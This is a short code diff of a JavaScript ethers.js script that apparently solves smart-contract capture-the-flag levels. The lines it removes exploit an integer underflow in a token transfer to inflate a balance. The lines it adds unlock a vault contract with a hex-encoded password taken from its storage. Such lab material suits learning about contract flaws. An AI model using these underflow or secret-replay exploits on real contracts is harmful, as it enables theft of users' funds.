@@ -10,17 +10,16 @@ const wallet = ethers.Wallet.fromMnemonic(MNEMONIC);
 const signer = wallet.connect(provider);
 
 const abi = [
-    "function transfer(address _to, uint _value) public returns (bool)",
-    "function balanceOf(address _owner) public view returns (uint balance)",
+    "function unlock(bytes32 _password) public"
 ]
 
-const instanceAddress = "0x3B00e6dcadeA99A43a1a69426ff926FDaB19a57C"
+const instanceAddress = "0x08Bd6CD6E8fC2d83030bEf8F458C65Fc7FD7A316"
 
 const solve = async () => {
     try {
         const interface = new ethers.utils.Interface(abi);
         const contract = new ethers.Contract(instanceAddress, interface, signer);
-        let tx = await contract.transfer(contract.address, 99999999) // 21000000 - 99999999 will cause an underflow and set my balance to abs(21000000 - 99999999)
+        const tx = await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29");
         const receipt = await tx.wait();
         console.log(receipt);
     } catch (e) {
